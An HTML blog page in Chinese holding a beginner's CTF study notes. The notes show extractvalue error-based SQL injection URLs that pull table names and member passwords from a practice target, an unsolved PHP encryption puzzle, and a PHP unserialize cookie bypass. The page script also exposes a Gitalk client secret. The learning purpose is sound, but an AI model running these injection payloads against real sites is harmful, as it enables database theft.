@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html>
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+  <title>13th-day - Cupid&#39;s Blog</title>
+  <meta charset="UTF-8">
+  <meta name="description" content="a new ctfer&#39;s study">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+
+  <link rel="shortcut icon" href="/favicon.ico" type="image/png">
+  <meta name="description" content="&amp;emsp;&amp;emsp;关于报错注入的一些小总结:MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml.ExtractValue() 使用XPath表示法从XML字符串中提取值UpdateXML()     返回替换的XML片段举例其用法:emsp;&amp;emsp;先从爆库开始">
+<meta property="og:type" content="article">
+<meta property="og:title" content="13th-day">
+<meta property="og:url" content="http://yoursite.com/2019/08/12/13th-day/index.html">
+<meta property="og:site_name" content="Cupid&#39;s Blog">
+<meta property="og:description" content="&amp;emsp;&amp;emsp;关于报错注入的一些小总结:MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml.ExtractValue() 使用XPath表示法从XML字符串中提取值UpdateXML()     返回替换的XML片段举例其用法:emsp;&amp;emsp;先从爆库开始">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-08-14T01:45:06.723Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="13th-day">
+<meta name="twitter:description" content="&amp;emsp;&amp;emsp;关于报错注入的一些小总结:MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml.ExtractValue() 使用XPath表示法从XML字符串中提取值UpdateXML()     返回替换的XML片段举例其用法:emsp;&amp;emsp;先从爆库开始">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
+   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
+  <link rel="stylesheet" href="/css/style.css?v=1577797662529">
+</head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div id="nexmoe-background">
+    <div class="nexmoe-bg" style="background-image: url(http://img3.imgtn.bdimg.com/it/u=3748941237,546001350&amp;fm=26&amp;gp=0.jpg)"></div>
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="Cupid" class="mdui-btn mdui-btn-icon"><img src="/images/namei.png"></a>
+       </div>
+    </div>
+  </div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="Cupid">
+            <img src="/images/namei.png" alt="Cupid">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>Articles</span>61</div>
+        <div><span>Tags</span>0</div>
+        <div><span>Categories</span>0</div>
+    </div>
+    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博客
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+    </ul>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Social</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://space.bilibili.com/20238211" target="_blank" mdui-tooltip="{content: '哔哩哔哩'}" style="color: rgb(231, 106, 141);background-color: rgba(231, 106, 141, .15);">
+            <i class="nexmoefont icon-bilibili"></i>
+        </a><a class="mdui-ripple" href="https://github.com/nexmoe/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+  
+  
+
+  
+  
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Archive</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2019 Cupid
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+            <img src="http://img3.imgtn.bdimg.com/it/u=3748941237,546001350&amp;fm=26&amp;gp=0.jpg">
+        
+        <h1>13th-day</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2019年08月12日</a>
+    <a><i class="nexmoefont icon-areachart"></i>954 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 4 分钟</a>
+    
+    
+  </div>
+  <article>
+    <p>&emsp;&emsp;关于报错注入的一些小总结:MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml.ExtractValue() 使用XPath表示法从XML字符串中提取值<br>UpdateXML()     返回替换的XML片段<br>举例其用法:<br>emsp;&emsp;先从爆库开始<a id="more"></a>:<br><a href="http://219.153.49.228:49919/new\_list.php?id=1&#39;" target="_blank" rel="noopener">http://219.153.49.228:49919/new\_list.php?id=1&#39;</a> and extractvalue(1,concat(0x7e,(database()),0x7e))--+<br>emsp;&emsp;然后开始爆表:<br><a href="http://219.153.49.228:49919/new\_list.php?id=1&#39;" target="_blank" rel="noopener">http://219.153.49.228:49919/new\_list.php?id=1&#39;</a> and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1 ),0x7e))--+<br>&emsp;&emsp;然后开始爆表里的字段：<br><a href="http://219.153.49.228:49919/new\_list.php?id=1%27%20and%20extractvalue" target="_blank" rel="noopener">http://219.153.49.228:49919/new\_list.php?id=1%27%20and%20extractvalue</a>(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’member’ ),0x7e))–+<br>emsp;&emsp;最后爆表里的数据:<br><a href="http://219.153.49.228:49919/new\_list.php?id=1%27%20and%20extractvalue" target="_blank" rel="noopener">http://219.153.49.228:49919/new\_list.php?id=1%27%20and%20extractvalue</a>(1,concat(0x7e,(select group_concat(password) from member ),0x7e))–+<br>emsp;&emsp;基本上就是and extractvalue(1,concat(0x7e,(查询语句),0x7e))最后可以用–+，也就是注释加符号的用法隔开最后的引号。<br>37.PHP_encrypt_1(ISCCCTF)<br>&emsp;&emsp;这道题没有链接，进去只有一个fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=<br>和一个文件，先将这个base64解密看一下。解码以后是乱码，先不管这个打开提示文件看一下。解压后是一个php文件，本地运行看一下。这儿由于它叫index.php因而直接打开了打开后是空白的,直接看代码如下所示:<br><?php
+function encrypt($data,$key)
+{
+    $key = md5('ISCC');
+    $x = 0;
+    $len = strlen($data);
+    $klen = strlen($key);
+    for ($i=0; $i < $len; $i++) { 
+        if ($x == $klen)
+        {
+            $x = 0;
+        }
+        $char .= $key[$x];
+        $x+=1;
+    }
+    for ($i=0; $i < $len; $i++) {
+        $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);
+    }
+    return base64\_encode($str);
+}
+?><br>上诉ord是返回字符串首字母的ascii值，然后strlen是返回字符串的长度。整个函数是一个加密函数，首先key的值是ISCC的md5加密，<br>md5(ISCC,32) = 729623334f0aa2784a1599fd374c120d<br>md5(ISCC,16) = 4f0aa2784a1599fd<br>这里有两种长度,但php的md5运行后是32位的因而舍弃16位情况。那么klen=32,data可能就是给出的那个数据是52位。现在直接将数字带入进去运行php试试。在一顿操作猛如虎后发现并没有效，在查看他人大量博文后发现自己理解错了题目意思，这道题是让自己写出解密函数按照加密函数的逆解出给出长串密文的对应明文即为key，由于个人能力不足此题暂放，后面来补。<br>38.flag.php(<a href="http://123.206.87.240:8002/flagphp/" title="flag.php" target="_blank" rel="noopener">http://123.206.87.240:8002/flagphp/</a>)<br>&emsp;&emsp;进入页面后发现是一个登陆框，但是任意输入数字点了登陆没反应，我想抓包试试。我发现这个Login可能本来就是个假的提交框，按了之后没有任何反应BP也接受不到提交包。题目最开始提示了一个hint，这个Hint就是暗示的意思但是去哪里找hint以及它是用来做什么的呢。<br>input value=”Login” type=”button”源代码中可以看到这就是个按钮框没有提交作用。再看哈有没有其他线索。一切都只给了一个hint,这种登陆框一般是sql注入，hint难道是用来传参的像id一样？试试/?hint=1,居然给出了大片的源代码。好了应该是代码审计了。<br>error_reporting(0);<br>include_once(“flag.php”);<br>$cookie = $_COOKIE[‘ISecer’];<br>if(isset($_GET[‘hint’])){<br>    show_source(_<em>FILE_</em>);<br>}<br>elseif (unserialize($cookie) === “$KEY”)<br>{<br>    echo “$flag”;<br>}<br><?php
+}
+$KEY='ISecer:www.isecer.com';
+?><br>也就是如果cookie的反序列化=key就输出flag.之前有做过反序列化的题，先去温习一哈。由于下面是一个单独的PHP因而上面的$key=””,因而先求的””的序列化为s:0:””;由于;再cookie中是不会正确上传到服务器的因而可以使用其Url编码%3B或者不写;进入BP后添加Cookie: ISecer=<br>s:0:””发包即可获得flag.<br>&emsp;&emsp;summary: 这道题主要要理清序列化和反序列化的关系，将一个序列化的东西再反序列化得到的就是序列化之前的东西，理解了这一点这道理就迎刃而解了。</p>
+
+  </article>
+  
+    
+<div class="nexmoe-post-copyright">
+<i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+<strong>Author：</strong>Cupid<br>
+<strong>Link：</strong><a href="http://yoursite.com/2019/08/12/13th-day/" title="http://yoursite.com/2019/08/12/13th-day/" target="_blank" rel="noopener">http://yoursite.com/2019/08/12/13th-day/</a><br>
+
+  <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+
+</div>
+
+
+  
+  <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+ 
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+ 
+    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="/js/app.js?v=1577797662599"></script>
+<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>
+
+
+
+  
+
+
+
+
+
+</body>
+
+</html>
